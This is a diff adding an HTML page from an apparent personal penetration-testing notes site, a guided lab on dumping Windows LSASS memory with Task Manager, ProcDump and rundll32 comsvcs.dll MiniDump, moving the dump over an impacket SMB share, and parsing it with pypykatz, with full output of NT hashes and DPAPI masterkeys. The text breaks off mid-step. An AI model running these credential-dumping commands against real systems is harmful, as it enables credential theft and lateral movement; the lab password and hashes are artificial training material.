@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Attacking LSASS — Corey Clay</title>
+<meta name="description" content="Attacking LSASS — why it holds credentials, dumping via Task Manager, ProcDump, and the native rundll32 + comsvcs.dll MiniDump technique; offline extraction with pypykatz and KvcForensic (Server 2025).">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#000000;--ink-2:#121318;--panel:#15171c;--panel-2:#191c22;
+    --line:#262a33;--line-soft:#1b1e24;
+    --fg:#e8eaed;--fg-dim:#b2b6bd;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#9fef00;--signal-soft:rgba(159,239,0,.14);--signal-line:rgba(159,239,0,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-body:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:15px;line-height:1.7;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background-color:var(--ink);background-image:linear-gradient(180deg,transparent 0%,var(--ink) 46%),linear-gradient(var(--line-soft) 1px,transparent 1px),linear-gradient(90deg,var(--line-soft) 1px,transparent 1px),radial-gradient(1100px 520px at 82% -8%,rgba(159,239,0,.05),transparent 60%);background-size:auto,64px 64px,64px 64px,auto;background-position:0 0,-1px -1px,-1px -1px,0 0}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(23,25,31,.97);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(23,25,31,.98);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+
+  .hub{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin:14px 0 10px}
+  @media (max-width:640px){.hub{grid-template-columns:1fr}}
+  .hub-card{display:block;border:1px solid var(--line);border-radius:11px;padding:24px 24px 22px;background:var(--panel);
+    transition:border-color .16s ease,transform .16s ease;position:relative}
+  .hub-card:hover{border-color:var(--signal-line);transform:translateY(-3px)}
+  .hub-card .idx{font-family:var(--f-mono);font-size:12px;color:var(--signal)}
+  .hub-card h3{font-family:var(--f-display);font-weight:600;font-size:21px;color:var(--fg);margin:8px 0 8px;letter-spacing:-.01em}
+  .hub-card p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 0 16px;line-height:1.5}
+  .hub-card .tags{display:flex;flex-wrap:wrap;gap:6px}
+  .hub-card .t{font-family:var(--f-mono);font-size:10.5px;color:var(--fg-dim);background:var(--panel-2);
+    border:1px solid var(--line-soft);padding:3px 8px;border-radius:5px}
+  .hub-card .go{position:absolute;top:22px;right:22px;font-family:var(--f-mono);font-size:16px;color:var(--muted);transition:.16s}
+  .hub-card:hover .go{color:var(--signal);transform:translateX(2px)}
+  .hub-card.soon{opacity:.6;pointer-events:none}
+  .hub-card.soon .go{content:''}
+  .hub-note{font-family:var(--f-mono);font-size:12.5px;color:var(--muted-2);margin-top:26px;border-left:2px solid var(--line);padding-left:16px}
+  .hub-empty{border:1px dashed var(--line);border-radius:12px;padding:52px 30px;text-align:center;margin:14px 0 10px}
+  .hub-empty .ico{font-family:var(--f-mono);font-size:13px;color:var(--signal);margin:0 0 12px}
+  .hub-empty h3{font-family:var(--f-display);font-weight:500;font-size:20px;color:var(--fg);margin:0 0 8px}
+  .hub-empty p{font-family:var(--f-body);font-size:15.5px;color:var(--muted);margin:0 auto;max-width:46ch;line-height:1.55}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ tools & utilities / attacking lsass</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a href="methodology.html">methodology</a>
+      <a href="enumeration.html">enumeration</a>
+      <a href="pre-exploitation.html">pre-exploitation</a>
+      <a href="exploitation.html">exploitation</a>
+      <a href="post-exploitation.html">post-exploitation</a>
+      <a class="here" href="tools-utilities.html" aria-current="page">tools &amp; utilities</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="tools-utilities.html">&lsaquo; tools &amp; utilities</a> &nbsp;/&nbsp; // dump-and-parse</p>
+  <h1>Attacking LSASS</h1>
+  <p>What LSASS is, why it holds NTLM hashes and Kerberos tickets, and three ways to dump it — GUI via Task Manager, CLI with Microsoft-signed ProcDump, and the LOLBin chain rundll32 + comsvcs.dll MiniDump. Finishes with offline extraction using pypykatz on Linux, and KvcForensic for the latest builds of Windows Server 2025 where pypykatz and Mimikatz fail.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#introduction-to-lsass"><strong>Introduction to LSASS</strong></a>
+      <a href="#what-is-lsass"><strong>What Is LSASS?</strong></a>
+      <a href="#attacking-lsass-with-task-manager"><strong>Attacking LSASS with Task Manager</strong></a>
+      <a href="#attacking-lsass-with-procdump"><strong>Attacking LSASS with ProcDump</strong></a>
+      <a href="#attacking-lsass-with-native-binaries"><strong>Attacking LSASS with Native Binaries</strong></a>
+      <a href="#extracting-secrets-from-lsass-with-pypykatz"><strong>Extracting Secrets from LSASS with pypykatz</strong></a>
+      <a href="#transfer-files-via-imapcket-smbserver">Transfer Files via imapcket-smbserver</a>
+      <a href="#extracting-secrets-from-lsass-with-kvcforensic"><strong>Extracting Secrets from LSASS with KvcForensic</strong></a>
+  </div>
+</nav>
+
+<main class="wrap">
+<h2 id="introduction-to-lsass"><strong>Introduction to LSASS</strong></h2>
+<p>Welcome to this Guided Lab on attacking LSASS! Before we start dumping credentials, we need to understand what we are actually attacking.</p>
+<p><a href="https://images.coursestack.com/4261d023-900a-443b-8d10-cdc2ee2dddb5/f77cf6ff-0400-4fa3-962c-54e73254ecf6"></a></p>
+<p>Image Credit: semanticscholar.org</p>
+<h2 id="what-is-lsass"><strong>What Is LSASS?</strong></h2>
+<p>In Windows operating systems, <strong>LSASS</strong> (Local Security Authority Subsystem Service) is a critical process responsible for enforcing security policy. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.</p>
+<h3><strong>Why Do Attackers Care?</strong></h3>
+<p>Because LSASS handles logins, it needs to store credentials in its process memory. Historically, it stored passwords in cleartext. While modern Windows versions (Windows 8.1 / Server 2012 R2 and newer) try to prevent cleartext storage by default, LSASS still holds highly valuable data, including NTLM hashes, Kerberos tickets, and sometimes cleartext passwords (if WDigest is enabled or poorly configured).</p>
+<p>If an attacker gains local Administrator or SYSTEM privileges, they can read the memory of <code>lsass.exe</code>, dump it to a file, and extract those credentials to move laterally across a network.</p>
+<p>In this Guided Lab, you will get hands-on with attacking LSASS from Task Manager, ProcDump, and Native Binaries. Finally, you will learn how to extract the secrets from the LSASS dump.</p>
+<p>We strongly encourage you to dump LSASS from EVERY method we show you to build practice.</p>
+<pre><code>Username: Administrator
+Password: ebz0yxy3txh9BDE*yeh
+</code></pre>
+<h2 id="attacking-lsass-with-task-manager"><strong>Attacking LSASS with Task Manager</strong></h2>
+<p>Let's start with the easiest, most visual method. You don't always need fancy hacker tools to dump memory; Windows provides built-in tools that can do the job perfectly.</p>
+<p>If an attacker has RDP (Remote Desktop Protocol) access or GUI access to a compromised machine, they can simply use the built-in Windows Task Manager.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li>Open Task Manager (Run as Administrator).</li>
+<li>Click on the Details tab.</li>
+<li>Scroll down to find lsass.exe.</li>
+<li>Right-click on lsass.exe and select Create memory dump file.</li>
+</ol>
+<p><a href="https://images.coursestack.com/4261d023-900a-443b-8d10-cdc2ee2dddb5/27cf2ce7-f9d6-4641-b807-028d5b27d26e"></a></p>
+<p>Windows will create a .dmp file (usually in the user's AppData\Local\Temp directory) containing everything LSASS had in memory at that exact second.</p>
+<p><a href="https://images.coursestack.com/4261d023-900a-443b-8d10-cdc2ee2dddb5/b1bee0c0-eb10-403f-8c3c-8cac53587cc0"></a></p>
+<h3><strong>Transfering the File:</strong></h3>
+<p>There are multiple ways to transfer the file. If you do not know how - a big part of hacking is being able to do research. Do a simple Google search on how to transfer files from Windows to Linux, and transfer the dump file to your attack machine.</p>
+<h2 id="attacking-lsass-with-procdump"><strong>Attacking LSASS with ProcDump</strong></h2>
+<p>While Task Manager is easy, attackers usually operate from a command-line interface (CLI). To dump memory via CLI without triggering immediate antivirus alerts, attackers often use <strong>ProcDump</strong>.</p>
+<p>ProcDump is a legitimate Microsoft Sysinternals tool designed for administrators to troubleshoot application crashes. Because it is digitally signed by Microsoft, it is often ignored by basic antivirus solutions.</p>
+<p>ProcDump is not installed by default, so you need to install it. The lab machine has internet access, and the .exe can be installed from https://learn.microsoft.com/en-us/sysinternals/downloads/procdump.</p>
+<h3><strong>The Command:</strong></h3>
+<p><code>procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp</code></p>
+<ul>
+<li><code>accepteula</code>: Automatically accepts the Microsoft user agreement (crucial for silent CLI execution).</li>
+<li><code>ma</code>: Tells ProcDump to write a "Full" memory dump.</li>
+<li><code>lsass.exe</code>: The target process.</li>
+<li><code>C:\lsass.dmp</code>: The output file location.</li>
+</ul>
+<pre><code class="language-c"> .\procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
+</code></pre>
+<p>!image.png</p>
+<p>!image.png</p>
+<h2 id="attacking-lsass-with-native-binaries"><strong>Attacking LSASS with Native Binaries</strong></h2>
+<p>Sometimes, bringing a tool like ProcDump onto a target system is too risky. Instead, attackers use <strong>LOLBins</strong> (Living Off the Land Binaries). These are executables that are already natively installed on Windows.</p>
+<p>One famous method uses <code>rundll32.exe</code> to execute a specific function inside <code>comsvcs.dll</code> (a built-in Windows DLL). This function, <code>MiniDumpW</code>, can dump process memory just like Task Manager.</p>
+<h3><strong>The Command:</strong></h3>
+<p>First, you need the Process ID (PID) of LSASS. You can find this by running <code>tasklist | findstr lsass</code>. Let's say the PID is <strong>644</strong>.</p>
+<p><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full</code></p>
+<p><em>Note: This command requires SeDebugPrivilege, which Administrator accounts have by default.</em></p>
+<pre><code class="language-c">tasklist | findstr lsass
+</code></pre>
+<p>!image.png</p>
+<pre><code class="language-c">rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full
+</code></pre>
+<h2 id="extracting-secrets-from-lsass-with-pypykatz"><strong>Extracting Secrets from LSASS with pypykatz</strong></h2>
+<p>Now that we have our <code>lsass.dmp</code> file (whether from Task Manager, ProcDump, or rundll32), we need to read it. Memory dumps are completely unreadable to the human eye, so we need a parser.</p>
+<p>While the original tool for this is Mimikatz (a Windows executable), running Mimikatz on a compromised machine is extremely noisy and almost guaranteed to trigger antivirus. Instead, modern attackers prefer <strong>offline parsing</strong>. They transfer the <code>.dmp</code> file to their own attacking machine (like Kali Linux) and parse it there.</p>
+<p>To do this on Linux, we use <strong>Pypykatz</strong>, which is a pure Python implementation of Mimikatz.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li><strong>Transfer the File:</strong> First, you would transfer <code>lsass.dmp</code> from the Windows target to your Kali machine (using a Python web server, SMB, or SCP).</li>
+<li><strong>Run Pypykatz:</strong> Open a terminal on your Kali machine and run the following command against the dump file:</li>
+</ol>
+<p><code>pypykatz lsa minidump lsass.dmp</code></p>
+<ul>
+<li><code>lsa</code>: Tells Pypykatz we want to target Local Security Authority secrets.</li>
+<li><code>minidump</code>: Specifies that we are feeding it an offline dump file, rather than trying to read live memory.</li>
+<li><code>lsass.dmp</code>: The name of the file you transferred.</li>
+</ul>
+<p>Once you hit enter, Pypykatz will parse the memory and output the NTLM hashes, cached credentials, and any cleartext passwords it can find!</p>
+<h2 id="transfer-files-via-imapcket-smbserver">Transfer Files via imapcket-smbserver</h2>
+<pre><code class="language-c">sudo impacket-smbserver -smb2support -username 'Administrator' -password 'ebz0yxy3txh9BDE*yeh' share /home/kali/HackSmarter/LSASS
+</code></pre>
+<p>!image.png</p>
+<h3>Open up File Explorer and navigate to your IP address and share folder you created</h3>
+<pre><code class="language-c">\\10.200.69.250\share 
+</code></pre>
+<p>!image.png</p>
+<p>Once connected you can see connections </p>
+<p>!image.png</p>
+<p>Copy and Paste the lsass.dmp file into our share folder</p>
+<p>!image.png</p>
+<p>!image.png</p>
+<pre><code class="language-c">sudo /root/.local/bin/pypykatz lsa minidump lsass.dmp
+
+INFO:pypykatz:Parsing file lsass.dmp
+FILE: ======== lsass.dmp =======
+== LogonSession ==
+authentication_id 14126838 (d78ef6)
+session_id 2
+username Administrator
+domainname EC2AMAZ-NJ20UPC
+logon_server EC2AMAZ-NJ20UPC
+logon_time 2026-07-08T23:11:27.219863+00:00
+sid S-1-5-21-1852509212-2415052799-4250738369-500
+luid 14126838
+    == MSV ==
+        Username: Administrator
+        Domain: EC2AMAZ-NJ20UPC
+        LM: NA
+        NT: d5cad8a9782b2879bf316f56936f1e36
+        SHA1: e7d2839f97b4a3dd1029711a7dcbc60cc2d13c06
+        DPAPI: e7d2839f97b4a3dd1029711a7dcbc60cc2d13c06
+    == WDIGEST [d78ef6]==
+        username Administrator
+        domainname EC2AMAZ-NJ20UPC
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: Administrator
+        Domain: EC2AMAZ-NJ20UPC
+    == WDIGEST [d78ef6]==
+        username Administrator
+        domainname EC2AMAZ-NJ20UPC
+        password None
+        password (hex)
+    == DPAPI [d78ef6]==
+        luid 14126838
+        key_guid a7aaadf5-29fc-4878-9b92-ba9f0fa8cf77
+        masterkey 285ac6e8fab02f2ec5152a942681606611e71ae64e889fc0e9a0a04c232f8882302c0b24fdca7f32d2db49c3ec7eccd796bc7da721911ef9640e57654bfdef3a
+        sha1_masterkey ec8cb45934e81c3ec04d068ed12269497b0d5ec8
+
+== LogonSession ==
+authentication_id 14112478 (d756de)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2026-07-08T23:11:26.036459+00:00
+sid S-1-5-90-0-2
+luid 14112478
+    == WDIGEST [d756de]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [d756de]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 14110099 (d74d93)
+session_id 2
+username UMFD-2
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-08T23:11:25.929290+00:00
+sid S-1-5-96-0-2
+luid 14110099
+    == WDIGEST [d74d93]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [d74d93]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 14107935 (d7451f)
+session_id 0
+username Administrator
+domainname EC2AMAZ-NJ20UPC
+logon_server EC2AMAZ-NJ20UPC
+logon_time 2026-07-08T23:11:23.927336+00:00
+sid S-1-5-21-1852509212-2415052799-4250738369-500
+luid 14107935
+
+== LogonSession ==
+authentication_id 64424 (fba8)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2026-07-08T22:50:15.319355+00:00
+sid S-1-5-90-0-1
+luid 64424
+    == WDIGEST [fba8]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [fba8]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username EC2AMAZ-NJ20UPC$
+domainname WORKGROUP
+logon_server 
+logon_time 2026-07-08T22:50:09.957764+00:00
+sid S-1-5-20
+luid 996
+    == WDIGEST [3e4]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: ec2amaz-nj20upc$
+        Domain: WORKGROUP
+    == WDIGEST [3e4]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 29000 (7148)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-08T22:50:08.782252+00:00
+sid S-1-5-96-0-0
+luid 29000
+    == WDIGEST [7148]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [7148]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 27406 (6b0e)
+session_id 0
+username 
+domainname 
+logon_server 
+logon_time 2026-07-08T22:50:04.735166+00:00
+sid None
+luid 27406
+
+== LogonSession ==
+authentication_id 14112158 (d7559e)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2026-07-08T23:11:26.022626+00:00
+sid S-1-5-90-0-2
+luid 14112158
+    == WDIGEST [d7559e]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [d7559e]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 269297 (41bf1)
+session_id 1
+username tyler
+domainname EC2AMAZ-NJ20UPC
+logon_server EC2AMAZ-NJ20UPC
+logon_time 2026-07-08T22:50:54.650770+00:00
+sid S-1-5-21-1852509212-2415052799-4250738369-1000
+luid 269297
+    == MSV ==
+        Username: tyler
+        Domain: EC2AMAZ-NJ20UPC
+        LM: NA
+        NT: 58a478135a93ac3bf058a5ea0e8fdb71
+        SHA1: 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+        DPAPI: 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+    == WDIGEST [41bf1]==
+        username tyler
+        domainname EC2AMAZ-NJ20UPC
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: tyler
+        Domain: EC2AMAZ-NJ20UPC
+    == WDIGEST [41bf1]==
+        username tyler
+        domainname EC2AMAZ-NJ20UPC
+        password None
+        password (hex)
+    == DPAPI [41bf1]==
+        luid 269297
+        key_guid 7a0f7860-70ab-4f58-b6a5-a25fdd907c48
+        masterkey 9093cd28887b8ca4356c7ed7bbf4dfc85754fa69487af220f82a7043462c676aeefd3458f54fa402fdcfbfed0305dbe0d1c0f26fccaac77a2019ab46be7b98ae
+        sha1_masterkey ce39131ba6272922bf489ed807ffe3f47208f581
+
+== LogonSession ==
+authentication_id 64447 (fbbf)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server 
+logon_time 2026-07-08T22:50:15.321367+00:00
+sid S-1-5-90-0-1
+luid 64447
+    == WDIGEST [fbbf]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [fbbf]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2026-07-08T22:50:15.158625+00:00
+sid S-1-5-19
+luid 997
+    == Kerberos ==
+        Username: 
+        Domain: 
+
+== LogonSession ==
+authentication_id 28979 (7133)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2026-07-08T22:50:08.782252+00:00
+sid S-1-5-96-0-1
+luid 28979
+    == WDIGEST [7133]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == WDIGEST [7133]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username EC2AMAZ-NJ20UPC$
+domainname WORKGROUP
+logon_server 
+logon_time 2026-07-08T22:50:03.342663+00:00
+sid S-1-5-18
+luid 999
+    == WDIGEST [3e7]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: ec2amaz-nj20upc$
+        Domain: WORKGROUP
+    == WDIGEST [3e7]==
+        username EC2AMAZ-NJ20UPC$
+        domainname WORKGROUP
+        password None
+        password (hex)
+    == DPAPI [3e7]==
+        luid 999
+        key_guid acd5517f-10fc-4c48-88ff-e697317a354a
+        masterkey 3c897c4e971df85c0655f4f607edf15c5c1d843df6d5db04cc7907b5934e028b26d1898d43331aef9966000a43fe0e9fa02d420be58ad134124dcab4a5904c1a
+        sha1_masterkey fc01df8cc298d0647717c2486306e76b3689b9df
+    == DPAPI [3e7]==
+        luid 999
+        key_guid c08fefad-c6e2-44af-8d2e-8a3bc477aa2a
+        masterkey ef4f8558e84b946c34df28eeb44453182c3f362a9039d405662bc0c36da7e62dcd2409f7ddff17eaa4001c106a2566be974e5d4a115cffdfaeeee4303daac227
+        sha1_masterkey cd5eae7dd97254b511f605525865ceb20173be08
+
+</code></pre>
+<h2 id="extracting-secrets-from-lsass-with-kvcforensic"><strong>Extracting Secrets from LSASS with KvcForensic</strong></h2>
+<blockquote>
+<p>Update from Tyler on 4/6/26
+</p>
+</blockquote>
+<p>I noticed pypykatz and mimikatz fails against the latest build of Windows Server 2025. If you are targeting Windows Server 2025 and are having issues parsing the dump file, KvcForensic should work.</p>
+<p>The author made some design choices different from both Mimikatz and Pypykatz (full details are on the Github page). The two I find most helpful is that it has zero dependencies and you only need to update a .json file to target the latest builds of Windows.</p>
+<h3><strong>Steps:</strong></h3>
+<ol>
+<li><strong>Transfer the File:</strong> First, you would transfer <code>lsass.dmp</code> from the Windows target to your Kali machine (using a Python web server, SMB, or SCP).</li>
+<li><strong>Download the latest Linux release</strong> from Github: https://github.com/wesmar/KvcForensic/releases/tag/latest</li>
+<li><strong>Unzip the file.</strong> You can do this with the following command (when prompted for a password, type <code>github.com</code>):</li>
+</ol>
+<pre><code>7z x KvcForensic_Linux.7z
+</code></pre>
+<ol>
+<li><strong>Make the binary executable.</strong> You can do this with the following command</li>
+</ol>
+<pre><code>chmod +x KvcForensic_static
+</code></pre>
+<p>1.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / attacking lsass · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
